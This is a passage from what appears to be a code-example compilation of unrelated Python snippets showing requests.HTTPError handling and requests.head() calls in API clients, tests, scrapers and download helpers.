        except requests.HTTPError as e:
            raise PluralsightApiException(e.response.text, uri) 
**************************************
def post(self, uri, data=None):
        try:
            result = self.session.post("{0}/{1}".format(self.base_url, uri), json=data)
            result.raise_for_status()

            return result.json()
        except requests.HTTPError as e:
            raise PluralsightApiException(e.response.text) 
**************************************
def put(self, uri, data=None):
        try:
            result = self.session.put("{0}/{1}".format(self.base_url, uri), json=data)
            result.raise_for_status()
        except requests.HTTPError as e:
            raise PluralsightApiException(e.response.text) 
**************************************
def delete(self, uri):
        try:
            result = self.session.delete("{0}/{1}".format(self.base_url, uri))
            result.raise_for_status()
        except requests.HTTPError as e:
            raise PluralsightApiException(e.response.text) 
**************************************
def rx_request(method, url, **kwargs):
    def subscribe(observer):
        response = requests.request(method, url, **kwargs)

        try:
            response.raise_for_status()
            observer.on_next(response)
            observer.on_completed()
        except requests.HTTPError as e:
            observer.on_error(e)

        return lambda: None

    return rx.Observable.create(subscribe) 
**************************************
def get_task_artifacts(destination, task, file_names, session, retry):
    status = task.get("status", {})
    if not status.get("runs"):
        logger.debug("No runs for task %s" % status["taskId"])
        return
    queue_base = get_tc_queue_base(status["taskId"])
    artifacts_base_url = queue_base + "task/%s/artifacts" % status["taskId"]
    try:
        artifacts = fetch_json(artifacts_base_url, session=session)
    except requests.HTTPError as e:
        logger.warning(e.message)
    artifact_urls = ["%s/%s" % (artifacts_base_url, item["name"])
                     for item in artifacts["artifacts"]
                     if any(item["name"].endswith("/" + file_name)
                            for file_name in file_names)]

    run = status["runs"][-1]
    if "_log_paths" not in run:
        run["_log_paths"] = {}
    for url in artifact_urls:
        params = {
            "task": status["taskId"],
            "file_name": url.rsplit("/", 1)[1]
        }
        log_name = "{task}_{file_name}".format(**params)
        success = False
        logger.debug("Trying to download {}".format(url))
        log_path = os.path.abspath(os.path.join(destination, log_name))
        if not os.path.exists(log_path):
            success = download(url, log_path, retry, session=session)
        else:
            success = True
        if not success:
            logger.warning("Failed to download log from {}".format(url))
        run["_log_paths"][params["file_name"]] = log_path 
**************************************
def _get_requests(self, url):
        out = self.empty_json
        try:
            r = requests.get(url, headers=self.headers,
                             auth=(self.username, self.password),
                             timeout=self.timeout, stream=True)
            s = ""
            for chunk in r.iter_content(1024):
                if chunk:
                    s += chunk
            out = json.loads(s)
        except requests.Timeout as e:
            print "Timeout for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "Timeout for url %s: %s" % (url,e,), out
        except requests.ConnectionError as e:
            print "ConnectionError for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "ConnectionError for url %s: %s" % (url,e,), out
        except requests.HTTPError as e:
            print "HTTPError for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "HTTPError for url %s: %s" % (url,e,), out
        except requests.RequestException as e:
            print "RequestException for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "RequestException for url %s: %s" % (url,e,), out
        
        return r.status_code, "OK", out 
**************************************
def _post_requests(self, url, data=""):
        out = self.empty_json
        if isinstance(data, dict):
            data = json.dumps(data)
        elif data:
            try:
                data = json.loads(data)
            except ValueError:
                print "Input not a valid JSON document"
                return 400, "Input not a valid JSON document", out
        try:
            r = requests.post(url, data=data, headers=self.headers,
                             auth=(self.username, self.password),
                             timeout=self.timeout)
        except requests.Timeout as e:
            print "Timeout for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "Timeout for url %s: %s" % (url,e,), out
        except requests.ConnectionError as e:
            print "ConnectionError for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "ConnectionError for url %s: %s" % (url,e,), out
        except requests.HTTPError as e:
            print "HTTPError for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "HTTPError for url %s: %s" % (url,e,), out
        except requests.RequestException as e:
            print "RequestException for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "RequestException for url %s: %s" % (url,e,), out
        return r.status_code, "OK", r.json() 
**************************************
def __init__(self, *args, **kwargs):
        self.email_message = kwargs.pop('email_message', None)
        self.payload = kwargs.pop('payload', None)

        if isinstance(self, HTTPError):
            self.response = kwargs.get('response', None)
        else:
            self.response = kwargs.pop('response', None)

        super(MailjetError, self).__init__(*args, **kwargs) 
**************************************
def get_links(session, url, proxy = None):
    """
    Receive a url, and return a BeautifulSoup object
    """
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.',
    }
    try:
        html = session.get(url, proxies = proxy, headers=headers)
        soup = BeautifulSoup(html.text, "lxml")
        return soup
    except URLRequired:
        return None
    except HTTPError:
        print("HTTPError") 
**************************************
def test_bucket_delete_with_content(self):
        self.client.buckets.create('test1')
        self.client.keys.create('test content', 'key', bucket='test1')
        with self.assertRaises(HTTPError):
            self.client.buckets.delete('test1') 
**************************************
def test_create_duplicate_key(self):
        self.client.buckets.create('test')
        self.client.keys.create('test content', 'key', bucket='test')
        with self.assertRaises(HTTPError):
            self.client.keys.create('test content', 'key', bucket='test') 
**************************************
def test_api_version(self, client_api_version, registry_api_version,
                         should_succeed):
        url = mock_registry(registry_api_version)
        if should_succeed:
            client = DockerRegistryClient(url, api_version=client_api_version)
            assert client.api_version == client_api_version
        else:
            with pytest.raises(HTTPError):
                client = DockerRegistryClient(url,
                                              api_version=client_api_version)
                client.refresh() 
**************************************
def show_repositories(self, client):
        try:
            repositories = client.repositories()
        except requests.HTTPError as e:
            if e.response.status_code == requests.codes.not_found:
                print("Catalog/Search not supported")
            else:
                raise
        else:
            print("Repositories:")
            for repository in repositories.keys():
                print("  - {0}".format(repository)) 
**************************************
def show_tags(self, client, repository):
        try:
            repo = client.repository(repository)
        except requests.HTTPError as e:
            if e.response.status_code == requests.codes.not_found:
                print("Repository {0} not found".format(repository))
            else:
                raise
        else:
            print("Tags in repository {0}:".format(repository))
            for tag in repo.tags():
                print("  - {0}".format(tag)) 
**************************************
def login_refresh(self):
        """ 刷新登录状态

        :return: 不返回
        """
        method = 'GET'
        url = c.BASE_URL + '/weapi/login/token/refresh'
        resp = self._raw_request(method, url, {})
        try:
            resp.raise_for_status()
        except requests.HTTPError as e:
            raise_for_code({'code': -1, 'message': str(e)}, method, url) 
**************************************
def _download_repodatas(
        self,
        repomd: RepoMetadata,
        # We mutate this dictionary on-commit to allow the caller to clean
        # up any stored repodata blobs if the download fails part-way.
        persist_storage_id_to_repodata: Mapping[str, Repodata],
        visitors: Iterable['RepoObjectVisitor'],
    ) -> Tuple[Set[Rpm], Mapping[str, Repodata]]:
        rpms = None  # We'll extract these from the primary repodata
        storage_id_to_repodata = {}  # Newly stored **and** pre-existing
        primary_repodata = pick_primary_repodata(repomd.repodatas)
        log.info(f'''`{self._repo_name}` repodata weighs {
            sum(rd.size for rd in repomd.repodatas)
        :,} bytes''')
        # Visitors see all declared repodata, even if some downloads fail.
        for visitor in visitors:
            for repodata in repomd.repodatas:
                visitor.visit_repodata(repodata)
        # Download in random order to reduce collisions from racing writers.
        for repodata in shuffled(repomd.repodatas):
            try:
                with _reportable_http_errors(repodata.location):
                    newly_stored, storage_id, maybe_rpms = \
                        self._download_repodata(
                            repodata, is_primary=repodata is primary_repodata,
                        )
                if newly_stored:
                    set_new_key(
                        persist_storage_id_to_repodata, storage_id, repodata,
                    )
                if maybe_rpms is not None:
                    # Convert to a set to work around buggy repodatas, which
                    # list the same RPM object twice.
                    rpms = set(maybe_rpms)
            except ReportableError as ex:
                # We cannot proceed without the primary file -- raise here
                # to trigger the "top-level retry" in the snapshot driver.
                if repodata is primary_repodata:
                    raise
                # This fake "storage ID" is not written to
                # `persist_storage_id_to_repodata`, so we will never attempt
                # to write it to the DB.  However, it does end up in
                # `repodata.json`, so the error is visible.
                storage_id = ex
            set_new_key(storage_id_to_repodata, storage_id, repodata)

        assert len(storage_id_to_repodata) == len(repomd.repodatas)
        assert rpms, 'Is the repo empty?'
        return rpms, storage_id_to_repodata

    # May raise `ReportableError`s to be caught by `_download_rpms`.
    # May raise a `requests.HTTPError` if the download fails. 
**************************************
def _get_data(self):
        self.data = None
        conf = get_config()
        try:
            res = requests.get('https://www.wienerlinien.at/ogd_realtime/monitor?rbl=%s&sender=%s'
                               % (','.join(map(str, conf['api']['wrlinien']['rbls'])), conf['api']['wrlinien']['key']))
        except RequestException or HTTPError:  # retry on error
            logger.error("Caught RequestException")
            res = requests.get('https://www.wienerlinien.at/ogd_realtime/monitor?rbl=%s&sender=%s'
                               % (','.join(map(str, conf['api']['wrlinien']['rbls'])), conf['api']['wrlinien']['key']))
        res.raise_for_status()
        api_data = res.json()

        if api_data['message']['value'] != 'OK':  # check if server sends OK
            logger.error('[WRL]: NOK. %s' % api_data)
            error_msg = "API returns NOK. Please check the message and the API Key."
            raise WrLinienApiException(error_msg)

        # parse to wrlinien dict
        translated_result = []
        for a_s in api_data['data']['monitors']:
            station = {
                'lines': [],
                'name': a_s['locationStop']['properties']['title'],
            }
            for a_s_l in a_s['lines']:
                line = {
                    'name': a_s_l['name'].rjust(3),
                    'direction': a_s_l['towards'],
                    'barrierFree': a_s_l['barrierFree'],
                    'trafficJam': a_s_l['trafficjam'],
                    'departures': []
                }
                for d in a_s_l['departures']['departure']:
                    if d['departureTime']:
                        line['departures'].append(d['departureTime']['countdown'])
                station['lines'].append(line)
            translated_result.append(station)

        wrlinien_data = {
            'stations': self._merge_stations_by_name(translated_result),
            'lastUpdate': time.strptime(api_data['message']['serverTime'], '%Y-%m-%dT%H:%M:%S.%f%z')
        }
        logger.info("retrieved data: %s" % wrlinien_data)
        self.data = wrlinien_data 
**************************************
def _get_data(self):
        conf = get_config()
        try:
            res = requests.post('https://www.yr.no/place/%s/%s/%s/forecast.xml'
                                % (conf['api']['yrno']['country'], conf['api']['yrno']['province'], conf['api']['yrno']['city']))
        except RequestException or HTTPError:  # retry on error
            logger.error("Caught RequestException")
            res = requests.post('https://www.yr.no/place/%s/%s/%s/forecast.xml'
                                % (conf['api']['yrno']['country'], conf['api']['yrno']['province'], conf['api']['yrno']['city']))
        res.raise_for_status()
        root = ET.fromstring(res.text)

        # filter data and parse to weather dict
        legal_xml = root.find('credit').find('link')
        location_xml = root.find('location')
        sun_xml = root.find('sun')
        weather_data = {
            'credit': {
                "text": legal_xml.get('text'),
                "url": legal_xml.get('url')
            },
            'city': location_xml.find('name').text,
            'country': location_xml.find('country').text,
            'lastUpdate': time.strptime(root.find('meta').find('lastupdate').text, time_format_str),
            'sun': {
                "rise": time.strptime(sun_xml.get('rise'), time_format_str),
                "set": time.strptime(sun_xml.get('set'), time_format_str)
            },
            "forecast": []
        }
        tabular_xml = root.find('forecast').find('tabular')
        for time_xml in tabular_xml.findall('time'):
            symbol_xml = time_xml.find('symbol')
            wind_xml = time_xml.find('windSpeed')
            weather_data['forecast'].append({
                'time': {
                    "from": time.strptime(time_xml.get('from'), time_format_str),
                    "to": time.strptime(time_xml.get('to'), time_format_str)
                },
                'symbol': {
                    "id": symbol_xml.get('number'),
                    "description": symbol_xml.get('name')
                },
                'precipitation': time_xml.find('precipitation').get('value'),
                'wind': {
                    "direction": time_xml.find('windDirection').get('code'),
                    "mps": wind_xml.get('mps'),
                    "description": wind_xml.get('name')
                },
                "celsius": time_xml.find('temperature').get('value')
            })

        logger.info("retrieved data: %s" % weather_data)
        self.data = weather_data 
**************************************
def initialize_mealpal():
    cookies_path = xdg.XDG_CACHE_HOME / 'mealpy' / COOKIES_FILENAME
    mealpal = MealPal()
    mealpal.session.cookies = MozillaCookieJar()

    if cookies_path.exists():
        try:
            mealpal.session.cookies.load(cookies_path, ignore_expires=True, ignore_discard=True)
        except UnicodeDecodeError:
            pass
        else:
            # hacky way of validating cookies
            sleep_duration = 1
            for _ in range(5):
                try:
                    MealPal.get_schedules('San Francisco')
                except requests.HTTPError:
                    # Possible fluke, retry validation
                    print(f'Login using cookies failed, retrying after {sleep_duration} second(s).')
                    time.sleep(sleep_duration)
                    sleep_duration *= 2
                else:
                    print('Login using cookies successful!')
                    return mealpal

        print('Existing cookies are invalid, please re-enter your login credentials.')

    while True:
        email, password = get_mealpal_credentials()

        try:
            mealpal.login(email, password)
        except requests.HTTPError:
            print('Invalid login credentials, please try again!')
        else:
            break

    # save latest cookies
    print(f'Login successful! Saving cookies as {cookies_path}.')
    mealpal.session.cookies.save(cookies_path, ignore_discard=True, ignore_expires=True)

    return mealpal 
**************************************
def search_proximity(lat=50.848, lon=4.351, radius=8):
    """Find sensors within given radius from a location.

    Args:
        lat: latitude of the center of search, in decimal degrees
        lon: longitude of the center of search, in decimal degrees
        radius: maximum distance from center, in kilometers

    Default values are the approximate center and radius of Brussels.

    Returns:
        Dataframe of matching sensors, listing sensor types, locations
        and distances in kilometers from the search center, indexed by
        sensor ID

    Raises:
        requests.HTTPError if request failed
    """
    url = (API_ENDPOINTS["proximity search pattern"]
           .format(lat=lat, lon=lon, radius=radius))
    call_rate_limiter()
    response = requests.get(url)
    response.raise_for_status()
    sensors = json_normalize(response.json())
    if len(sensors) == 0:
        sensors = pd.DataFrame(columns=["sensor_type", "latitude", "longitude",
                                        "distance"])
        sensors.index.name = "sensor_id"
        return sensors
    sensors = (sensors[["sensor.id", "sensor.sensor_type.name",
                        "location.latitude", "location.longitude"]]
               .rename(columns={"sensor.id": "sensor_id",
                                "sensor.sensor_type.name": "sensor_type",
                                "location.latitude": "latitude",
                                "location.longitude": "longitude"}))
    for col in "latitude", "longitude":
        sensors[col] = pd.to_numeric(sensors[col], downcast="float")
    sensors.set_index("sensor_id", inplace=True)

    # Drop duplicates - sensors appear once for each measurement in past 5 mins
    sensors = sensors[~sensors.index.duplicated()]

    # Calculate distances from search center and sort by those distances
    sensors["distance"] = sensors.apply(lambda x:
                                        utils.haversine(lat, lon,
                                                        float(x["latitude"]),
                                                        float(x["longitude"])),
                                        axis=1)
    sensors.sort_values("distance", inplace=True)

    return sensors 
**************************************
def test_upload_a_picture(self):
        # picture not exists
        with patch('os.path.exists', return_value=False), \
             self.assertRaises(AssertionError):
            utils.upload_a_picture('jike.png')
        # cannot figure out mimetype
        with patch('os.path.exists', return_value=True), \
             patch('os.path.split', return_value=('a', 'b')), \
             patch('mimetypes.guess_type', return_value=(None, None)), \
             self.assertRaises(AssertionError):
            utils.upload_a_picture('jike.png')
        # not upload picture
        with patch('os.path.exists', return_value=True), \
             self.assertRaises(ValueError):
            utils.upload_a_picture('a.txt')

        success_reponse = {'success': True, 'key': 'key'}
        responses.add(responses.POST, constants.ENDPOINTS['picture_upload'],
                      json=success_reponse, status=200)
        failed_response = {'success': False}
        responses.add(responses.POST, constants.ENDPOINTS['picture_upload'],
                      json=failed_response, status=200)
        responses.add(responses.POST, constants.ENDPOINTS['picture_upload'],
                      status=401)
        # success call
        with patch('os.path.exists', return_value=True), \
             patch('jike.utils.get_uptoken', return_value='token'), \
             patch('builtins.open', mock_open(read_data='picture_content')):
            result = utils.upload_a_picture('jike.png')
        self.assertEqual(result, 'key')
        self.assertEqual(len(responses.calls), 1)
        self.assertEqual(responses.calls[0].request.url, constants.ENDPOINTS['picture_upload'])
        self.assertEqual(responses.calls[0].response.json(), success_reponse)
        self.assertTrue(responses.calls[0].request.headers['Content-Type'].startswith('multipart/form-data;'))
        self.assertTrue(b'jike.png' in responses.calls[0].request.body)
        # failed call
        with patch('os.path.exists', return_value=True), \
             patch('jike.utils.get_uptoken', return_value='token'), \
             patch('builtins.open', mock_open(read_data='picture_content')), \
             self.assertRaises(RuntimeError):
            utils.upload_a_picture('jike.png')
        self.assertEqual(len(responses.calls), 2)
        self.assertEqual(responses.calls[1].response.json(), failed_response)
        # failed again call
        with patch('os.path.exists', return_value=True), \
             patch('jike.utils.get_uptoken', return_value='token'), \
             patch('builtins.open', mock_open(read_data='picture_content')), \
             self.assertRaises(requests.HTTPError) as cm:
            utils.upload_a_picture('jike.png')
        self.assertEqual(len(responses.calls), 3)
        self.assertEqual(cm.exception.response.status_code, 401) 
**************************************
def main():
  parser = argparse.ArgumentParser(
      description='Get a url and print its document.',
      prog='./runit.py pycurl.py')
  parser.add_argument('--url', required=True, help='the url to fetch')
  parser.add_argument('--status-json', metavar='PATH', required=True,
      help='Write HTTP status result JSON. If set, all complete HTTP '
           'responses will exit with 0, regardless of their status code.')

  parser.add_argument('--transient-retry', type=int, default=10,
      help='Number of retry attempts (with exponential backoff) to make on '
           'transient failure (default is %(default)s).')
  parser.add_argument('--headers-json', type=argparse.FileType('r'),
      help='A json file containing any headers to include with the request.')
  parser.add_argument('--outfile', help='write output to this file')
  parser.add_argument('--strip-prefix', action='store', type=json.loads,
      help='Expect this string at the beginning of the response, and strip it.')

  args = parser.parse_args()

  headers = None
  if args.headers_json:
    headers = json.load(args.headers_json)

  if args.strip_prefix and len(args.strip_prefix) > CHUNK_SIZE:
    raise ValueError('Prefix length (%d) must be <= chunk size (%d)' % (
        len(args.strip_prefix), CHUNK_SIZE))

  status = {}
  try:
    status_code, size = _download(
        args.url, args.outfile, headers, args.transient_retry,
        args.strip_prefix)
    status = {
      'status_code': status_code,
      'success': True,
      'size': size,
      'error_body': None,
    }
  except requests.HTTPError as e:
    body = e.response.text
    status = {
      'status_code': e.response.status_code,
      'success': False,
      'size': len(body),
      'error_body': body,
    }

  with open(args.status_json, 'w') as fd:
    json.dump(status, fd)
  return 0 
**************************************
def __request_requests(self, url, method, data=None):
        out = self.empty_json
        if isinstance(data, dict):
            data = json.dumps(data)
        elif data:
            try:
                data = json.loads(data)
            except ValueError:
                print "Input not a valid JSON document"
                return 400, "Input not a valid JSON document", out
        try:
            if method == 'GET':
                return _get_requests(url, headers=self.headers,
                                     auth=(self.username, self.password),
                                     timeout=self.timeout)
            elif method == 'PUSH':
                return _post_requests(url, data=data, headers=self.headers,
                                      auth=(self.username, self.password),
                                      timeout=self.timeout)
            elif method == 'DELETE':
                r = requests.delete(url, headers=self.headers,
                                    auth=(self.username, self.password),
                                    timeout=self.timeout)
            elif method == 'PUT':
                r = requests.put(url, data=data, headers=self.headers,
                                 auth=(self.username, self.password),
                                 timeout=self.timeout)
            elif method == 'PATCH':
                r = requests.patch(url, data=data, headers=self.headers,
                                   auth=(self.username, self.password),
                                   timeout=self.timeout)
        except requests.Timeout as e:
            print "Timeout for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "Timeout for url %s: %s" % (url,e,), out
        except requests.ProxyError as e:
            print "ProxyError for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "ProxyError for url %s: %s" % (url,e,), out
        except requests.SSLError as e:
            print "SSLError for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "SSLError for url %s: %s" % (url,e,), out
        except requests.ConnectionError as e:
            print "ConnectionError for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "ConnectionError for url %s: %s" % (url,e,), out
        except requests.HTTPError as e:
            print "HTTPError for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "HTTPError for url %s: %s" % (url,e,), out
        except requests.RequestException as e:
            print "RequestException for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "RequestException for url %s: %s" % (url,e,), out
        return r.status_code, "OK", r.json() 

Python requests.head() Examples

**************************************
def _check_bad_blob(self, bad_blob):
        with self.repo_server_thread({'bad_blob': bad_blob}) as (host, port):
            # Drive-by test of HEAD requests -- note that this doesn't
            # detect the error yet, so the next GET "succeeds".
            req_head = requests.head(f'http://{host}:{port}/bad_blob')
            req = requests.get(f'http://{host}:{port}/bad_blob')
            self.assertEqual(req_head.status_code, req.status_code)
            self.assertEqual(_no_date(req_head.headers), _no_date(req.headers))
            # You'd think that `requests` would error on this, but, no...
            # https://blog.petrzemek.net/2018/04/22/
            #   on-incomplete-http-reads-and-the-requests-library-in-python/
            self.assertEqual(200, req.status_code)
            self.assertLess(
                req.raw.tell(),  # Number of bytes that were read
                int(req.headers['content-length']),
            )
            # Ok, so we didn't get enough bytes, let's retry. This verifies
            # that the server memoizes integrity errors correctly.
            req = requests.get(f'http://{host}:{port}/bad_blob')
            self.assertEqual(500, req.status_code)
            self.assertIn(b'file_integrity', req.content)
            return req.content.decode() 
**************************************
def complete(self):
        r=head(str(self.config.get("url")+self.config.get("file")+".zip"))
        remote=None
        if r.headers.get("Last-Modified"):
            datetime_object=parser.parse(r.headers["Last-Modified"])
            remote=float(datetime_object.timestamp())
        if os.path.isfile(self.config.get("file")+".zip"):
            statbuf=os.stat(self.config.get("file")+".zip")
            here=float(statbuf.st_mtime)
        else:
            return False
        if here<remote:
            return False
        if self.txt>0:
            return True
        else:
            return False 
**************************************
def complete(self):
        for url in self.config["urls"]:
            fd=url.split("/")[-1]
            r=head(url,auth=(self.config["username"],self.config["username"]))
            remote=None
            if r.headers.get("Last-Modified"):
                datetime_object=parser.parse(r.headers["Last-Modified"])
                remote=float(datetime_object.timestamp())
            if os.path.isfile(fd):
                statbuf=os.stat(fd)
                here=float(statbuf.st_mtime)
            else:
                return False
            if here<=remote:
                return False
        return True 
**************************************
def _get_wp_api_url(self, url):
        """
        Private function for finding the WP-API URL.

        Arguments
        ---------

        url : str
            WordPress instance URL.
        """
        resp = requests.head(url)

        # Search the Links for rel="https://api.w.org/".
        wp_api_rel = resp.links.get('https://api.w.org/')

        if wp_api_rel:
            return wp_api_rel['url']
        else:
            # TODO: Rasie a better exception to the rel doesn't exist.
            raise Exception 
**************************************
def get_server_time(self):
        """
        Gets remote server time using HTTP
        """
        headers = {
            'User-Agent': self.user_agent
        }
        # Sometimes HEAD requests fail so we try multiple times
        for attempt in range(10):
            try:
                r = requests.head(self.url, headers=headers)
            except requests.exceptions.ConnectionError:
                time.sleep(3)
            else:
                break
        if r.status_code == 200:
            t = parsedate(r.headers['Date'])
            return datetime.fromtimestamp(time.mktime(t))
        else:
            raise Exception('Remote server did not respond. Is it down?') 
**************************************
def test_head(self):
        '''test_head
        *description*
            Test Case 1: Send HEAD request to Google.  (Should get 302)
            Test Case 2: Send HEAD request to twitter. (Should get 200)
        '''
        s = Session()
        s.cUrl.setopt(pycurl.VERBOSE, True)
        # r0   = s.head('https://www.google.com')
        # req0 = requests.head('https://www.google.com')
        r1   = s.head('https://twitter.com/?lang=en')
        req1 = requests.head('https://twitter.com/?lang=en')
        s.proxy.terminate()

        r2 = s.head('https://twitterneverexist.com/?lang=en')

        # self.assertEqual(r0.status, req0.status_code)
        # self.assertEqual(r0.body  , req0.text)
        self.assertEqual(r1.status, req1.status_code)
        self.assertEqual(r1.body  , req1.text)
        self.assertEqual(r2, None) 
**************************************
def validate_response_app_endpoint(p_client, appId):
    ingress_list = p_client.list_ingress(namespaceId=appId).data
    assert len(ingress_list) == 1
    ingress = ingress_list[0]
    if hasattr(ingress, 'publicEndpoints'):
        for public_endpoint in ingress.publicEndpoints:
            url = \
                public_endpoint["protocol"].lower() + "://" + \
                public_endpoint["hostname"]
            print(url)
            try:
                r = requests.head(url)
                assert r.status_code == 200, \
                    "Http response is not 200. Failed to launch the app"
            except requests.ConnectionError:
                print("failed to connect")
                assert False, "failed to connect to the app" 
**************************************
def to_torrent(magnet_link):
    """turn a magnet link to a link to a torrent file"""
    infoHash = parse_magnet(magnet_link)['infoHash']
    torcache = 'http://torcache.net/torrent/' + infoHash + '.torrent'
    torrage = 'https://torrage.com/torrent/' + infoHash + '.torrent'
    reflektor = 'http://reflektor.karmorra.info/torrent/' + \
        infoHash + '.torrent'
    thetorrent = 'http://TheTorrent.org/'+infoHash
    btcache = 'http://www.btcache.me/torrent/'+infoHash
    for link in [torcache, torrage, reflektor, btcache, thetorrent]:
        try:
            print "Checking "+link
            response = requests.head(link, headers=HEADERS)
            if response.headers['content-type'] in ['application/x-bittorrent',
                                                    'application/octet-stream']:
                return link
        except requests.exceptions.ConnectionError:
            pass
    return 
**************************************
def get_remote_source_length():
    url = os.environ.get('SP_REMOTE_SOURCE')
    try:
        response = requests.head(url, allow_redirects=True, timeout=10)
    except requests.exceptions.RequestException as e:
        puts(colored.red('[HEAD] %s' % url))
        puts(colored.red('Failed to get remote installation size: %s' % e))
        sys.exit(1)
    size = response.headers.get('content-length')
    if not size:
        size = response.headers.get('Content-Length')
    if not size or not size.isdigit():
        puts(colored.red('Could not fetch the remote Content-Length.'))
        sys.exit(1)
    try:
        size = int(size)
    except ValueError:
        pass
    return size 
**************************************
def main():
    print('hello world')
    print('contacting google.com...')
    r = requests.head("https://www.google.com")
    print("status code:", r.status_code)
    print("PATH:", os.getenv("PATH"))
    result = helper.add(1, 1)
    print(f"1 + 1 = {result}")
    try:
        with open(Path(BASE_DIR, "input.txt")) as f:
            content = f.read().strip()
        print(content)
    except IOError:
        print("Warning: input.txt was not found")
    #
    fname = Path(BASE_DIR, "output.txt")
    print("writing to the following file:", fname)
    with open(fname, "w") as g:
        print("writing to a file", file=g)

############################################################################## 
**************************************
def validate_href(image_href):
        """Validate HTTP image reference.

        :param image_href: Image reference.
        :raises: exception.ImageRefValidationFailed if HEAD request failed or
            returned response code not equal to 200.
        :returns: Response to HEAD request.
        """
        try:
            response = requests.head(image_href)
            if response.status_code != http_client.OK:
                raise exception.ImageRefValidationFailed(
                    image_href=image_href,
                    reason=("Got HTTP code %s instead of 200 in response to "
                            "HEAD request." % response.status_code))
        except requests.RequestException as e:
            raise exception.ImageRefValidationFailed(image_href=image_href,
                                                     reason=e)
        return response 
**************************************
def is_downloadable(major: int, minor: int, patch: int) -> bool:
    """Test whether is a downloadable nuke version.

    Args:
        major (int): Major version
        minor (int): Minor version
        patch (int): Patch version

    Returns:
        bool: Test result
    """

    version = f'{major}.{minor}v{patch}'
    url = ('https://thefoundry.s3.amazonaws.com/'
           f'products/nuke/releases/{version}/Nuke{version}-linux-x86-release-64.tgz')
    LOGGER.debug('testing download: %s', version)
    resp = requests.head(url, timeout=3)

    return resp.status_code == 200 
**************************************
def resolve_short_url(url):
    if url=='':
        return graph_nodes['tweetWithoutURL']
        
    try:
        #Follow the redirections of a URL
        r = requests.head(url, allow_redirects='HEAD', timeout=url_timeout)
        if r.status_code != 403:            
            r.raise_for_status()

        #Avoid blacklisted and flat URLs
        domain, path = analyze_url(r.url)
        if domain in blacklistURLs or path in ['', '/']:
            r.url = ''

        return re.sub('\?.*', '', re.sub('^http://', 'https://', r.url))

    #Catch the different errors       
    except requests.HTTPError as e:
        return graph_nodes['HTTPError']
    except:
        return graph_nodes['TimeoutError']

#Get outgoing links from article 
**************************************
def move_head_to_tail(self, head_proxy, log_level=logging.INFO, mesg=None, *arg, **kwargs):
        if self._proxy_count <= 1:
            return False
        # with self.rlock:
        if head_proxy and head_proxy.hostname != self.head_proxy.hostname:
            logger.debug("move_head(%s)_to_TAIL() fail cause it's not the head", head_proxy)
            return False
        if not head_proxy:
            head_proxy = self.head_proxy
        if mesg:
            logger.log(logging.INFO, "move_head(%s)_to_TAIL() cause " + mesg, head_proxy, *arg, **kwargs)
        self.fix_top = False
        head_proxy.error_time = time.time()
        self._move_head_to_tail()
        for i in range(1, self._proxy_count-1):
            if not self.head_proxy.pause:
                break
            self._move_head_to_tail()
        self.try_select_head_proxy(force_to_head=True)
        return True 
**************************************
def _download_report(source_url, destination_file, chunk_size):
        response = requests.head(source_url)
        content_length = int(response.headers['Content-Length'])

        start_byte = 0
        while start_byte < content_length:
            end_byte = start_byte + chunk_size - 1
            if end_byte >= content_length:
                end_byte = content_length - 1

            headers = {'Range': 'bytes=%s-%s' % (start_byte, end_byte)}
            response = requests.get(source_url, stream=True, headers=headers)
            chunk = response.raw.read()
            destination_file.write(chunk)
            start_byte = end_byte + 1
        destination_file.close() 
**************************************
def httpd():
    """Start a new detached httpd container, yield to the test, then stop the container."""
    client = docker.from_env()
    container = client.containers.run("httpd_alpine", detach=True, ports={'80/tcp': 8080})

    # Wait up to 10 seconds for httpd to finish starting.
    start_time = time.time()
    while time.time() - start_time <= 10:
        try:
            assert requests.head('http://localhost:8080').status_code == 200
        except (AssertionError, requests.exceptions.ConnectionError):
            time.sleep(0.1)
        else:
            break

    # Yield to caller, then stop.
    yield container
    container.stop() 
**************************************
def get_picture_url(cls, id, topic_id=None):
        if topic_id is not None:
            person = cls.by_id(id, topic_id)
        else:
            person = cls.collection.find_one({'id': str(id)})
        if not person:
            return None

        url = f"{environ.get('PERSON_PICTURE_URL_BASE')}/l/{person['id']}.jpg"

        # Make sure the URL is valid to prevent facebook errors
        r = requests.head(url)
        if r.status_code == 404:
            return None

        return url 
**************************************
def process_image(image):
    medium_size = 'https:' + image['representations']['medium']
    thumb_size = 'https:' + image['representations']['thumb']
    result = requests.head(medium_size)
    size = int(result.headers['Content-Length'])
    if size >= 10000000: # 10 MB max size.
        return None
    mp4_url = convert_to_mp4(medium_size)
    if mp4_url is not None:
        return mp4_url, thumb_size, image['id'], (image['width'], image['height'])
    else:
        return None 
**************************************
def _parse(self, html):
        doc = BeautifulSoup(html, 'lxml')
        ogs = doc.html.head.findAll(property=re.compile(r'^og'))

        for og in ogs:
            if og.has_attr('content'):
                self.__data__[og['property'][3:]] = og['content'] 
**************************************
def complete(self):
        r=head(self.config["url"],auth=(self.config["username"],self.config["username"]))
        remote=None
        if r.headers["Last-Modified"]:
            datetime_object=parser.parse(r.headers["Last-Modified"])
            remote=float(datetime_object.timestamp())
        if os.path.isfile(self.config["file"]):
            statbuf=os.stat(self.config["file"])
            here=float(statbuf.st_mtime)
        else:
            return False
        if here>remote:
            return True
        else:
            return False 
**************************************
def process_gravatar(content):
